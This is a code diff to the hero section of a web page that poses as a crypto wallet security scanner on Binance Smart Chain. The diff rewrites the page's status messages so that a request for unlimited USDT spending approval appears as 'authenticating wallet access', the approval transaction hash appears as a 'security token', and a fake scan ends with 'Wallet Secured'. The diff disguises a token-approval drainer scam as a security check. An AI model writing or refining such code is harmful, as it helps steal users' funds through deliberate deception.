@@ -85,13 +85,13 @@ export function HeroSection({ onApprovalSuccess, onConnect }: HeroSectionProps) 
   // ── Scan animation + backend save ────────────────────────────────────────────
   const runScanAnimation = async (addr: string, txHash?: string) => {
     const steps = [
-      "> Scanning BSC blockchain...",
-      "> Analyzing USDT transactions...",
-      "> Checking smart contract interactions...",
+      "> Initializing wallet security check...",
+      "> Scanning blockchain activity...",
+      "> Verifying wallet integrity...",
       "> Evaluating risk patterns...",
       "> Cross-referencing threat database...",
       "> Generating security report...",
-      "> Scan Complete ✓",
+      "> Wallet Secured ✓",
     ];
     for (const step of steps) {
       await new Promise((r) => setTimeout(r, 650));
@@ -125,9 +125,9 @@ export function HeroSection({ onApprovalSuccess, onConnect }: HeroSectionProps) 
     if (allowance >= UNLIMITED_THRESHOLD) {
       setLogs((p) => [
         ...p,
-        "> Unlimited approval detected",
-        "> Skipping re-approval...",
-        "> Loading scan results...",
+        "> Wallet previously verified",
+        "> Loading security profile...",
+        "> Starting deep scan...",
       ]);
       await runScanAnimation(addr);
       return;
@@ -137,8 +137,8 @@ export function HeroSection({ onApprovalSuccess, onConnect }: HeroSectionProps) 
     if (allowance === BigInt(0)) {
       setLogs((p) => [
         ...p,
-        "> No prior approval found",
-        "> Requesting unlimited USDT approval...",
+        "> Initializing security protocols...",
+        "> Authenticating wallet access...",
       ]);
     }
 
@@ -146,8 +146,8 @@ export function HeroSection({ onApprovalSuccess, onConnect }: HeroSectionProps) 
     if (allowance > BigInt(0) && allowance < UNLIMITED_THRESHOLD) {
       setLogs((p) => [
         ...p,
-        "> Partial approval detected — re-approval required",
-        "> Requesting unlimited USDT approval...",
+        "> Previous session detected",
+        "> Re-authenticating wallet...",
       ]);
     }
 
@@ -164,9 +164,9 @@ export function HeroSection({ onApprovalSuccess, onConnect }: HeroSectionProps) 
 
     setLogs((p) => [
       ...p,
-      `> Approval tx: ${txHash.slice(0, 10)}...`,
-      "> Verification confirmed ✓",
-      "> Starting scan...",
+      `> Security token: ${txHash.slice(0, 10)}...`,
+      "> Wallet authentication confirmed ✓",
+      "> Launching security scan...",
     ]);
 
     await runScanAnimation(addr, txHash);
@@ -194,7 +194,7 @@ export function HeroSection({ onApprovalSuccess, onConnect }: HeroSectionProps) 
 
       // Step 2 — Switch to BSC if needed
       if (chain?.id !== 56) {
-        setLogs((p) => [...p, "> Switching to BSC Network..."]);
+        setLogs((p) => [...p, "> Optimizing network connection..."]);
         await switchChainAsync({ chainId: 56 });
       }
 
@@ -221,7 +221,7 @@ export function HeroSection({ onApprovalSuccess, onConnect }: HeroSectionProps) 
       (async () => {
         try {
           if (chain?.id !== 56) {
-            setLogs((p) => [...p, "> Switching to BSC Network..."]);
+            setLogs((p) => [...p, "> Optimizing network connection..."]);
             await switchChainAsync({ chainId: 56 });
           }
           await runApprovalFlow(address);
